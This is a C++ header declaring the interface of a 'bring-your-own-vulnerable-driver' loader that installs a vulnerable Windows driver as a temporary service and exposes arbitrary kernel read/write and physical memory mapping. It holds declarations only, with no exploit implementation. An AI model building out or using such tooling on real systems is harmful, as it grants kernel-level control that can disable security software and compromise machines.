// byovd.h — bring-your-own-vulnerable-driver loader + kernel primitives
#pragma once
#include <windows.h>
#include <cstdint>
#include <string>
#include "vuln_drivers.h"

namespace byovd {

// Load the highest-priority vulnerable driver found on disk. Service name chosen.
// Returns 0 + fills |err| on failure.
int Load(std::string* err);

// Unload + delete the temporary service.
int Unload();

// Arbitrary kernel virtual read/write. Returns false on ioctl failure.
bool KernelRead(uint64_t addr, void* out, size_t size);
bool KernelWrite(uint64_t addr, const void* src, size_t size);

// Map physical memory -> virtual in our process. Caller UnmapPhysical() after.
// Only valid when the loaded driver exposes ARB_PHYS_MAP.
bool MapPhysical(uint64_t phys, size_t size, void** outVa, uint64_t* outMapHandle);
bool UnmapPhysical(void* va, uint64_t mapHandle);

// Which driver got loaded (nullptr before Load).
const VulnDriverEntry* LoadedDriver();

} // namespace byovd
